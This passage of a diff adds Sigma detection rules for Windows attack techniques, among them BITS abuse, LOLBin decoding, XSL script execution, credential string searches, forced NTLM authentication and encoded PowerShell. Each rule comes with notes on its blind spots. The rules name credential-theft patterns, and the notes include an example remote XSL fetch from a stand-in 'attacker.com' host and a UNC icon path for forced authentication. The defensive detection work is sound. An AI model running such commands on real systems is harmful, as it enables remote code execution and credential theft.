+  * The Issue: The most common debugger check — calling `IsDebuggerPresent()` or `CheckRemoteDebuggerPresent()` — leaves no registry or command-line trace.
+  * The Fix: Requires EDR API-level hooking to detect calls to those specific Win32 debug-check functions.
+* Problem 2: Heap Flag Checks
+  * The Issue: Malware checking NtGlobalFlag (0x70) directly via memory reading bypasses this rule.
+  * The Fix: Memory forensics tools or kernel-level introspection are required to catch this technique variant.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: stealth/AN2098-T1197-DET0955.md
+RULE TITLE: BITS Job Transfer or Notification Command Abuse (AN2098)
+==========================================================================================
+
+### 1. Technique Breakdown: T1197
+
+* What it is: BITS Jobs. Adversaries may abuse Windows Background Intelligent Transfer Service (BITS) to download, upload, or execute files while bypassing common defenses — BITS traffic blends with normal Windows Update traffic.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. bitsadmin.exe and PowerShell BITS cmdlets produce command-line artifacts.
+  - NIDS (Suricata + Zeek): PARTIAL. Outbound HTTP/S BITS traffic can be seen but is indistinguishable from Windows Update without context.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - Windows Event ID 59/60/61 (BITS transfer operational logs) could add coverage but are rarely forwarded.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: BITS Job Transfer or Notification Command Abuse
+Detects bitsadmin.exe or PowerShell BITS cmdlets being used to transfer files or set persistence via notification commands.
+
+```yaml
+title: BITS Job Transfer or Notification Command Abuse (AN2098)
+id: 3f7a1c82-4e9d-4b21-8f3d-c5a2e6f91b04
+status: experimental
+description: Detects bitsadmin.exe creating BITS jobs to transfer files or setting notification commands for persistence. Also covers PowerShell BITS abuse. Includes OriginalFileName to resist binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_bitsadmin:
+        Image|endswith:
+            - '\bitsadmin.exe'
+    selection_bitsadmin_ofn:
+        OriginalFileName: 'bitsadmin.exe'
+    selection_bitsadmin_cli:
+        CommandLine|contains:
+            - '/transfer'
+            - '/addfile'
+            - '/setnotifycmdline'
+            - '/resume'
+    selection_ps:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_cli:
+        CommandLine|contains:
+            - 'Start-BitsTransfer'
+            - 'Add-BitsFile'
+    filter_wsus:
+        ParentImage|endswith:
+            - '\svchost.exe'
+        CommandLine|contains: 'bits'
+    condition: (((selection_bitsadmin or selection_bitsadmin_ofn) and selection_bitsadmin_cli) or ((selection_ps or selection_ps_ofn) and selection_ps_cli)) and not filter_wsus
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - ParentImage
+    - User
+falsepositives:
+    - Windows Update and WSUS clients using BITS for legitimate software downloads.
+level: medium
+tags:
+    - attack.defense_evasion
+    - attack.persistence
+    - attack.t1197
+    - analytic.an2098
+    - detection.det0955
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: COM API Abuse
+  * The Issue: Attackers using the BITS COM API directly (IBackgroundCopyManager) in C# or PowerShell will not spawn bitsadmin.exe.
+  * The Fix: Monitor BITS operational log Event IDs 59, 60, 61 for unexpected job creation, especially to external IPs.
+* Problem 2: Notification Command Persistence
+  * The Issue: Setting /setnotifycmdline creates persistence that fires when a BITS job completes — this may fire hours or days later.
+  * The Fix: Audit the BITS job database (`%ALLUSERSPROFILE%\Microsoft\Network\Downloader\`) for jobs with non-standard notification commands.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: stealth/AN2099-T1140-DET0956.md
+RULE TITLE: File Decode or Deobfuscation via LOLBins (AN2099)
+==========================================================================================
+
+### 1. Technique Breakdown: T1140
+
+* What it is: Deobfuscate/Decode Files or Information. Adversaries may use obfuscated files or information to hide artifacts of an intrusion, and may need to decode/deobfuscate them before execution. Common tools include certutil, expand, and copy /b.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines for decode operations are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local file operation.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: File Decode or Deobfuscation via Living-off-the-Land Binaries
+Detects certutil, expand, or copy being used to decode or concatenate binary payloads on disk.
+
+```yaml
+title: File Decode or Deobfuscation via LOLBins (AN2099)
+id: 7b2e4f16-9a3c-4d58-ae12-81f7c3b52e90
+status: experimental
+description: Detects certutil.exe -decode/-decodehex, expand.exe, or cmd copy /b being used to decode obfuscated payloads. Includes OriginalFileName to resist binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_certutil:
+        Image|endswith:
+            - '\certutil.exe'
+    selection_certutil_ofn:
+        OriginalFileName: 'CertUtil.exe'
+    selection_certutil_cli:
+        CommandLine|contains:
+            - '-decode'
+            - '-decodehex'
+            - '-urlcache'
+    selection_expand:
+        Image|endswith:
+            - '\expand.exe'
+    selection_expand_ofn:
+        OriginalFileName: 'expand.exe'
+    selection_expand_cli:
+        CommandLine|re:
+            - '(?i)expand\s+.+\.(cab|zip|b64|enc)'
+    selection_copy_b:
+        Image|endswith:
+            - '\cmd.exe'
+    selection_copy_b_ofn:
+        OriginalFileName: 'Cmd.Exe'
+    selection_copy_b_cli:
+        CommandLine|contains:
+            - 'copy /b'
+            - 'copy/b'
+    condition: ((selection_certutil or selection_certutil_ofn) and selection_certutil_cli) or ((selection_expand or selection_expand_ofn) and selection_expand_cli) or ((selection_copy_b or selection_copy_b_ofn) and selection_copy_b_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Certificate management tools using certutil for legitimate certificate import/export.
+    - Build pipelines using copy /b to concatenate binary files.
+level: medium
+tags:
+    - attack.defense_evasion
+    - attack.t1140
+    - analytic.an2099
+    - detection.det0956
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: PowerShell Decode
+  * The Issue: Attackers using `[System.Convert]::FromBase64String()` in PowerShell bypass certutil detection entirely.
+  * The Fix: Monitor PowerShell Script Block Logging (Event ID 4104) for Base64 decode patterns.
+* Problem 2: Custom Decoder Binaries
+  * The Issue: Attackers may ship their own XOR decoder or base64 utility to avoid LOLBin detection.
+  * The Fix: Detect execution of unsigned, recently-dropped binaries in temp paths via Sysmon Event ID 11 + 1.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: stealth/AN2100-T1202-DET0957.md
+RULE TITLE: Indirect Command Execution via Trusted Windows Utilities (AN2100)
+==========================================================================================
+
+### 1. Technique Breakdown: T1202
+
+* What it is: Indirect Command Execution. Adversaries may abuse Windows utilities to proxy execution of malicious commands or payloads through trusted, signed Windows binaries (LOLBins), bypassing application control solutions.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local execution.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Indirect Command Execution via Trusted Windows Utilities
+Detects forfiles.exe, pcalua.exe, or other trusted Windows binaries being used to indirectly execute commands or payloads.
+
+```yaml
+title: Indirect Command Execution via Trusted Windows Utilities (AN2100)
+id: 1c4d8e29-5f7a-4b83-9c16-d2e3f5a87b31
+status: experimental
+description: Detects LOLBin abuse where forfiles.exe, pcalua.exe, or similar trusted binaries are used to proxy execution of commands or payloads, bypassing application control. Includes OriginalFileName to resist binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_forfiles:
+        Image|endswith:
+            - '\forfiles.exe'
+    selection_forfiles_ofn:
+        OriginalFileName: 'forfiles.exe'
+    selection_forfiles_cli:
+        CommandLine|contains:
+            - '/c '
+    selection_pcalua:
+        Image|endswith:
+            - '\pcalua.exe'
+    selection_pcalua_ofn:
+        OriginalFileName: 'pcalua.exe'
+    selection_pcalua_cli:
+        CommandLine|contains:
+            - ' -a '
+    filter_scheduled:
+        ParentImage|endswith:
+            - '\taskeng.exe'
+            - '\svchost.exe'
+    condition: (((selection_forfiles or selection_forfiles_ofn) and selection_forfiles_cli) or ((selection_pcalua or selection_pcalua_ofn) and selection_pcalua_cli)) and not filter_scheduled
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - ParentImage
+    - User
+falsepositives:
+    - Legitimate batch scripts using forfiles.exe to operate on files older than a certain date.
+level: medium
+tags:
+    - attack.defense_evasion
+    - attack.t1202
+    - analytic.an2100
+    - detection.det0957
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Other LOLBins
+  * The Issue: There are dozens of additional trusted binaries (msiexec /q, mavinject, cmstp, etc.) that achieve indirect execution. This rule only covers forfiles and pcalua.
+  * The Fix: Supplement with dedicated rules for each high-priority LOLBin (e.g., LOLBAS project list).
+* Problem 2: Child Process Relationship
+  * The Issue: The real detection value is in the child process spawned by forfiles — the command after /c is what executes the payload.
+  * The Fix: Use Sysmon Event ID 1 ParentImage/ParentCommandLine fields to detect unexpected processes spawned by forfiles.exe.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: stealth/AN2101-T1216-DET0958.md
+RULE TITLE: Microsoft-Signed Script Proxy Execution (AN2101)
+==========================================================================================
+
+### 1. Technique Breakdown: T1216
+
+* What it is: System Script Proxy Execution. Adversaries may use trusted scripts signed by Microsoft (e.g., pubprn.vbs, manage-bde.wsf) to proxy execution of malicious code, bypassing application control policies that trust Microsoft-signed scripts.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Command lines for script proxy execution are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local execution.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Microsoft-Signed Script Proxy Execution
+Detects cscript.exe or wscript.exe executing known Microsoft-signed scripts abused for proxy execution.
+
+```yaml
+title: Microsoft-Signed Script Proxy Execution (AN2101)
+id: 9e6b3a47-2d1f-4c85-b7e8-4f9a2c63d817
+status: experimental
+description: Detects cscript.exe or wscript.exe executing known Microsoft-signed scripts commonly abused to bypass application control (pubprn.vbs, manage-bde.wsf, SyncAppvPublishingServer.vbs). Includes OriginalFileName to resist binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\cscript.exe'
+            - '\wscript.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'cscript.exe'
+            - 'wscript.exe'
+    selection_scripts:
+        CommandLine|contains:
+            - 'pubprn.vbs'
+            - 'manage-bde.wsf'
+            - 'SyncAppvPublishingServer.vbs'
+            - 'winrm.vbs'
+            - 'slmgr.vbs'
+    filter_legitimate:
+        CommandLine|contains:
+            - 'slmgr.vbs /ato'
+            - 'slmgr.vbs /dlv'
+            - 'slmgr.vbs /xpr'
+            - 'winrm.vbs quickconfig'
+    condition: (selection_images or selection_ofn) and selection_scripts and not filter_legitimate
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - ParentImage
+    - User
+falsepositives:
+    - Legitimate license activation using slmgr.vbs on Windows activations (filtered above).
+level: high
+tags:
+    - attack.defense_evasion
+    - attack.t1216
+    - analytic.an2101
+    - detection.det0958
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Unlisted Signed Scripts
+  * The Issue: New Microsoft-signed scripts are discovered regularly as proxy execution vectors (e.g., LOLBAS additions). This rule only covers known, documented ones.
+  * The Fix: Periodically update the script list from the LOLBAS project.
+* Problem 2: WSH Configuration
+  * The Issue: If Windows Script Host is disabled via Group Policy, wscript/cscript execution will fail — but attackers may re-enable it first.
+  * The Fix: Monitor for WSH re-enablement registry changes (`HKLM\Software\Microsoft\Windows Script Host\Settings\Enabled`).
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: stealth/AN2102-T1220-DET0959.md
+RULE TITLE: XSL Script Execution via WMIC or MSXSL (AN2102)
+==========================================================================================
+
+### 1. Technique Breakdown: T1220
+
+* What it is: XSL Script Processing. Adversaries may bypass application control and process malicious XSL scripts using wmic.exe (via /format or xsl: arguments) or msxsl.exe to execute embedded JScript or VBScript payloads.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Command lines for XSL execution are captured.
+  - NIDS (Suricata + Zeek): YES. XSL files fetched from remote URLs via wmic /format:URL produce HTTP traffic.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: XSL Script Execution via WMIC or MSXSL
+Detects wmic.exe with /format: pointing to remote or unusual XSL files, or msxsl.exe execution.
+
+```yaml
+title: XSL Script Execution via WMIC or MSXSL (AN2102)
+id: 5d9f2b38-7c4e-4a91-b6d3-8e1a5f72c946
+status: experimental
+description: "Detects wmic.exe using /format: to load XSL stylesheets (which can execute embedded scripts) or direct msxsl.exe execution. Both bypass application control policies. Includes OriginalFileName to resist binary-rename evasion."
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains:
+            - '/format:'
+            - 'xsl:'
+    selection_msxsl:
+        Image|endswith:
+            - '\msxsl.exe'
+    selection_msxsl_ofn:
+        OriginalFileName: 'msxsl.exe'
+    filter_local_format:
+        CommandLine|re: '(?i)/format:(list|table|csv|hform|htable|value|rawxml|xml|mof|textvaluelist)(?:\s|$)'
+    condition: (((selection_wmic or selection_wmic_ofn) and selection_wmic_cli) or selection_msxsl or selection_msxsl_ofn) and not filter_local_format
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Legitimate WMIC output formatting using built-in /format: switches for reporting.
+level: high
+tags:
+    - attack.defense_evasion
+    - attack.t1220
+    - analytic.an2102
+    - detection.det0959
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Local XSL File
+  * The Issue: Attackers may drop the XSL file locally first and reference it by local path, which looks less suspicious than a URL.
+  * The Fix: The filter_local_format excludes only the built-in named formats. Custom local XSL file paths (e.g., /format:C:\temp\evil.xsl) will still trigger.
+* Problem 2: Remote URL Fetching
+  * The Issue: wmic /format:http://attacker.com/evil.xsl fetches and executes remotely — the HTTP request may be the only non-host-based indicator.
+  * The Fix: Correlate this rule with Zeek HTTP logs showing wmic.exe as the requesting process for .xsl files.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: credential-access/AN2103-T1552-DET0960.md
+RULE TITLE: Credential String Search in Files and Registry (AN2103)
+==========================================================================================
+
+### 1. Technique Breakdown: T1552
+
+* What it is: Unsecured Credentials. Adversaries may search for unsecured credentials stored in files, registry, or configuration files on compromised systems to obtain them for lateral movement or privilege escalation.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Command-line credential searches are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local file access.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Credential String Search in Files and Registry
+Detects the use of findstr or reg query to search for password strings stored in plaintext files or registry keys.
+
+```yaml
+title: Credential String Search in Files and Registry (AN2103)
+id: 2a8c5e71-3f9b-4d26-c8e1-7b4d9a15f263
+status: experimental
+description: Detects findstr.exe or reg.exe being used to search for plaintext password strings in files or registry, indicating unsecured credential harvesting. Includes OriginalFileName to resist binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_findstr:
+        Image|endswith:
+            - '\findstr.exe'
+    selection_findstr_ofn:
+        OriginalFileName: 'FINDSTR.EXE'
+    selection_findstr_cli:
+        CommandLine|contains:
+            - 'password'
+            - 'passwd'
+            - 'pwd'
+            - 'credentials'
+            - 'connectionstring'
+    selection_reg:
+        Image|endswith:
+            - '\reg.exe'
+    selection_reg_ofn:
+        OriginalFileName: 'reg.exe'
+    selection_reg_cli:
+        CommandLine|contains:
+            - 'password'
+            - 'passwd'
+            - 'DefaultPassword'
+            - 'AutoAdminLogon'
+    filter_av_scan:
+        ParentImage|endswith:
+            - '\MsMpEng.exe'
+            - '\SenseCnfg.exe'
+    condition: (((selection_findstr or selection_findstr_ofn) and selection_findstr_cli) or ((selection_reg or selection_reg_ofn) and selection_reg_cli)) and not filter_av_scan
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Security scanners or vulnerability assessment tools searching for plaintext credential exposure.
+level: high
+tags:
+    - attack.credential_access
+    - attack.t1552
+    - analytic.an2103
+    - detection.det0960
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: PowerShell Credential Search
+  * The Issue: `Select-String` or `Get-Content | Where-Object` in PowerShell achieves the same result without invoking findstr.exe.
+  * The Fix: Monitor PowerShell Script Block Logging (Event ID 4104) for password/credential string searches.
+* Problem 2: Case Sensitivity
+  * The Issue: `PASSWORD`, `Password`, `password` are all common variants. Sigma's `contains` is case-insensitive by default in most SIEM implementations, but verify your deployment.
+  * The Fix: Confirm case-insensitive matching is enabled in your SIEM's Sigma translation backend.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: credential-access/AN2104-T1187-DET0961.md
+RULE TITLE: Forced Authentication via UNC Path or SCF File Creation (AN2104)
+==========================================================================================
+
+### 1. Technique Breakdown: T1187
+
+* What it is: Forced Authentication. Adversaries may gather credential material by invoking or forcing a user's system to authenticate to a server they control, capturing NTLMv2 challenge/response hashes via SMB relay or Responder-style tools.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Security Event ID 4648.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. UNC path usage and .scf/.lnk file creation produce artifacts.
+  - NIDS (Suricata + Zeek): YES. Outbound SMB to unexpected external IPs is detectable.
+* Log Sources Covered:
+  - Sysmon Event ID 11 (FileCreate) and Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - Network NTLM challenge/response capture requires NIDS rules outside Sigma scope.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Forced Authentication via UNC Path or SCF File Creation
+Detects the creation of .scf files with UNC icon paths or net use commands to attacker-controlled shares.
+
+```yaml
+title: Forced Authentication via UNC Path or SCF File Creation (AN2104)
+id: 8f3b6d94-1e7c-4a52-b9f5-2c8e4a37d582
+status: experimental
+description: Detects creation of .scf files with UNC icon paths or net use commands targeting non-standard shares, used to force NTLM authentication to attacker-controlled servers. Includes OriginalFileName to resist binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_net:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+    selection_net_ofn:
+        OriginalFileName:
+            - 'net.exe'
+            - 'net1.exe'
+    selection_net_cli:
+        CommandLine|re:
+            - '(?i)net(1)?\s+use\s+\\\\\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
+    selection_ps_unc:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_unc_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_unc_cli:
+        CommandLine|re:
+            - '(?i)New-PSDrive.+\\\\d{1,3}'
+    condition: ((selection_net or selection_net_ofn) and selection_net_cli) or ((selection_ps_unc or selection_ps_unc_ofn) and selection_ps_unc_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Administrators using net use to map drives to internal file servers by IP address.
+level: high
+tags:
+    - attack.credential_access
+    - attack.t1187
+    - analytic.an2104
+    - detection.det0961
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: .scf File Drop via File Create
+  * The Issue: .scf files with `IconFile=\\attacker\share` dropped in monitored directories (e.g., Downloads) force authentication when the folder is opened. This requires Sysmon Event ID 11 (FileCreate) detection, not process creation.
+  * The Fix: Add a companion FileCreate rule matching `*.scf` creation events in user-accessible directories.
+* Problem 2: WebDAV Forced Auth
+  * The Issue: HTTP/WebDAV-based forced authentication (e.g., \\attacker\webdav via file:// in a browser) does not involve net.exe at all.
+  * The Fix: Monitor outbound WebDAV (port 80/443) NTLM traffic patterns using Zeek.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: stealth/AN2105-T1036-DET0962.md
+RULE TITLE: System Binary Name Used from Non-Standard Path (AN2105)
+==========================================================================================
+
+### 1. Technique Breakdown: T1036
+
+* What it is: Masquerading. Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign — e.g., naming a malicious binary svchost.exe or placing it in an unexpected path.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process image path and OriginalFileName are captured.
+  - NIDS (Suricata + Zeek): NO. Host-level process metadata required.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: System Binary Name Used from Non-Standard Path
+Detects processes using the name of a critical Windows system binary executing from a non-system directory, indicating masquerading.
+
+```yaml
+title: System Binary Name Used from Non-Standard Path (AN2105)
+id: 4c1a9f53-8b2e-4d67-a3c7-9f5b8e24c719
+status: experimental
+description: Detects well-known Windows system binary names (svchost, lsass, explorer, csrss) executing from paths outside %SystemRoot% or %SystemRoot%\System32, indicating masquerading. Does NOT use OriginalFileName as the attack is specifically about abusing a trusted binary name.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_suspicious_names:
+        Image|endswith:
+            - '\svchost.exe'
+            - '\lsass.exe'
+            - '\explorer.exe'
+            - '\csrss.exe'
+            - '\winlogon.exe'
+            - '\services.exe'
+            - '\smss.exe'
+    filter_legitimate_paths:
+        Image|startswith:
+            - 'C:\Windows\'
+    condition: selection_suspicious_names and not filter_legitimate_paths
+fields:
+    - Image
+    - CommandLine
+    - ParentImage
+    - User
+falsepositives:
+    - Security tools or application sandboxes that legitimately run renamed copies of Windows binaries for testing.
+level: critical
+tags:
+    - attack.defense_evasion
+    - attack.t1036
+    - analytic.an2105
+    - detection.det0962
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Legitimate System Path Variations
+  * The Issue: Some Windows update processes and repair tools temporarily run system binaries from non-standard paths (e.g., WinSxS, servicing directories).
+  * The Fix: Extend filter_legitimate_paths to include `C:\Windows\WinSxS\` and `C:\Windows\Servicing\` if false positives are observed.
+* Problem 2: OriginalFileName Mismatch
+  * The Issue: A more complete masquerade check would also verify that svchost.exe has `OriginalFileName: svchost.exe` — a binary with a different OriginalFileName would have been caught by Sprint 1/2 OFN rules already.
+  * The Fix: Add an AND condition requiring `OriginalFileName != <expected>` for completeness if the SIEM supports it.
+* Problem 3: Case Sensitivity
+  * The Issue: Windows paths are case-insensitive; `C:\windows\system32\svchost.exe` is legitimate but might not match `C:\Windows\System32\` startswith exactly.
+  * The Fix: Ensure case-insensitive path matching is enabled in your SIEM's Sigma translation backend.
+
+
+==========================================================================================
+FILE: stealth/AN2106-T1027-DET0963.md
+RULE TITLE: PowerShell Encoded Command or Heavy Obfuscation Execution (AN2106)
+==========================================================================================
+
+### 1. Technique Breakdown: T1027
+
+* What it is: Obfuscated Files or Information. Adversaries may attempt to make an executable or file difficult to discover or analyze by encoding, encrypting, or otherwise obfuscating its contents — most commonly via PowerShell Base64 encoded commands.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. PowerShell -EncodedCommand and similar flags are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local obfuscation.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: PowerShell Encoded Command or Heavy Obfuscation Execution
+Detects PowerShell launched with encoded command flags or deeply nested string obfuscation patterns.
+
+```yaml
+title: PowerShell Encoded Command or Heavy Obfuscation Execution (AN2106)
+id: 6e2d4b87-9f1a-4c53-b8d2-3a7c1e56f948
+status: experimental
+description: Detects PowerShell launched with -EncodedCommand or common obfuscation flags (e.g. -Enc, -ec, -e), used by adversaries to hide malicious commands from command-line logging. Includes OriginalFileName to resist binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_encoded:
+        CommandLine|re:
+            - '(?i)\s+-e(nc(odedcommand)?)?\s+[A-Za-z0-9+/=]{20,}'
+            - '(?i)\s+-ec\s+[A-Za-z0-9+/=]{20,}'
+    filter_known_tools:
+        ParentImage|endswith:
+            - '\vscode\Code.exe'
+            - '\WindowsPowerShell\v1.0\powershell.exe'
+        CommandLine|contains:
+            - 'Import-Module'
+    condition: (selection_images or selection_ofn) and selection_encoded and not filter_known_tools
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - ParentImage
+    - User
+falsepositives:
+    - Legitimate software deployment tools (SCCM, Ansible) that encode PowerShell commands for safe transmission.
+level: high
+tags:
+    - attack.defense_evasion
+    - attack.t1027
+    - analytic.an2106
+    - detection.det0963
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Script Block Obfuscation
+  * The Issue: Obfuscation techniques like string concatenation, character substitution, or SecureString encoding are not caught by this command-line rule.
+  * The Fix: Enable PowerShell Script Block Logging (Event ID 4104) — deobfuscated code is logged after execution before it runs.
+* Problem 2: Invoke-Obfuscation Variants
+  * The Issue: The Invoke-Obfuscation framework produces hundreds of obfuscation variants that may not use -EncodedCommand at all.
+  * The Fix: Combine with AMSI (Antimalware Scan Interface) monitoring for runtime deobfuscation detection.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: credential-access/AN2107-T1539-DET0964.md
+RULE TITLE: Browser Cookie Database Access by Non-Browser Process (AN2107)
+==========================================================================================
+
+### 1. Technique Breakdown: T1539
+
+* What it is: Steal Web Session Cookie. Adversaries may steal web application or service session cookies and use them to gain access to web applications or internet services as an authenticated user without needing credentials.
+* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Sysmon File Access (Event ID 11).
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process access to browser cookie databases is detectable.
+  - NIDS (Suricata + Zeek): NO. Local file access.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - Sysmon Event ID 11 (FileCreate) could detect cookie file copies but is high-volume.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Browser Cookie Database Access by Non-Browser Process
+Detects non-browser processes accessing Chrome, Edge, or Firefox cookie SQLite databases — a common credential/session theft pattern.
+
+```yaml
+title: Browser Cookie Database Access by Non-Browser Process (AN2107)
